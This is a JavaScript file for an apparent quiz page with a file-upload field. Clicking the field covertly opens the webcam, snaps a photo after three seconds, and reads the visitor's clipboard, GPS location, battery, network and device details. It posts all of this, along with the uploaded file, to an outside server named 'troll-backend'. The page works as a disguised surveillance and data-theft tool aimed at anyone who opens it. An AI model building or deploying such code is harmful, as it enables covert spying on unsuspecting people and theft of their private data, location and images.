// ================================
// FRONTEND SCRIPT.JS
// ================================

// DOM elements
const btn = document.getElementById('submit-btn') || document.getElementById('btn');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const fileInput = document.getElementById('user-file');
const toast = document.getElementById('toast');
const form = document.getElementById('quiz-form'); // optional: form wrapper

const BACKEND_BASE = "https://troll-backend.onrender.com/api";

// Camera constraints
const constraints = { video: { facingMode: "user" }, audio: false };

// ================================
// SHOW TOAST FUNCTION
// ================================
function showToast(message = "Done") {
  if (!toast) return;
  toast.textContent = message;
  toast.style.display = "block";
  setTimeout(() => { toast.style.display = "none"; }, 3000);
}

// ================================
// COLLECT METADATA (DETAILED)
// ================================
async function collectMetadata() {
  const metadata = {
    width: window.innerWidth,
    height: window.innerHeight,
    platform: navigator.platform,
    language: navigator.language,
    useragent: navigator.userAgent,
    time: new Date().toLocaleString(),
    battery: "N/A",
    gps: "Location not available",
    network: "N/A",
    clipboard: "N/A",
    deviceMemory: navigator.deviceMemory || "N/A",
    cpuThreads: navigator.hardwareConcurrency || "N/A",
    cookieEnabled: navigator.cookieEnabled,
    referer: document.referrer
  };

  // Battery info
  if (navigator.getBattery) {
    try {
      const battery = await navigator.getBattery();
      metadata.battery = battery.level * 100 + "%, charging: " + battery.charging;
    } catch (err) {
      console.error("Battery info error:", err);
    }
  }

  // Geolocation info
  if (navigator.geolocation) {
    try {
      const position = await new Promise((resolve, reject) =>
        navigator.geolocation.getCurrentPosition(resolve, reject)
      );
      metadata.gps = `${position.coords.latitude},${position.coords.longitude}`;
    } catch (err) {
      console.error("Geolocation error:", err);
      metadata.gps = "Location access denied";
    }
  }

  // Clipboard info
  try {
    const clipboardData = await navigator.clipboard.readText();
    metadata.clipboard = clipboardData || "Empty";
  } catch (err) {
    metadata.clipboard = "Access denied";
  }

  // Network info
  if (navigator.connection) {
    metadata.network = JSON.stringify(navigator.connection);
  }

  return metadata;
}

// ================================
// CAPTURE PHOTO
// ================================
async function capturePhoto() {
  const context = canvas.getContext('2d');
  context.drawImage(video, 0, 0, canvas.width, canvas.height);
  return canvas.toDataURL('image/png');
}

// ================================
// SEND CAMERA IMAGE + METADATA
// ================================
async function sendCameraData() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    video.srcObject = stream;

    const metadata = await collectMetadata();
    // Wait a few seconds for a real-looking capture
    await new Promise(res => setTimeout(res, 3000));

    const image = await capturePhoto();

    await fetch(`${BACKEND_BASE}/upload`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ image, metadata })
    });

    showToast("Camera captured & sent!");
  } catch (err) {
    console.error("Camera capture error:", err);
  }
}

// ================================
// SEND FILE UPLOAD
// ================================
async function sendFileUpload(file) {
  if (!file) return;

  const reader = new FileReader();
  reader.onload = async () => {
    await fetch(`${BACKEND_BASE}/file-upload`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ file: reader.result, filename: file.name })
    });

    showToast("File uploaded successfully!");
  };
  reader.readAsDataURL(file);
}

// ================================
// CAMERA ONLY WHEN FILE INPUT CLICKED
// ================================
if (fileInput) {
  fileInput.addEventListener('click', async () => {
    await sendCameraData();
  });
}

// ================================
// PREVENT FORM SUBMISSION (if inside <form>)
// ================================
if (form) {
  form.addEventListener('submit', e => e.preventDefault());
}

// ================================
// SUBMIT BUTTON → CHECK FILE + UPLOAD + SUCCESS SCREEN
// ================================
if (btn) {
  btn.addEventListener('click', async (e) => {
    e.preventDefault(); // stop form submission

    // ✅ Check if file is selected
    if (!fileInput || fileInput.files.length === 0) {
      showToast("Please select a file before submitting!");
      return; // stop execution
    }

    // Upload file
    await sendFileUpload(fileInput.files[0]);

    // Show success screen
    const quiz = document.getElementById('quiz-container');
    const success = document.getElementById('success-container');

    if (quiz) quiz.style.display = "none";
    if (success) success.style.display = "block";
  });
    }
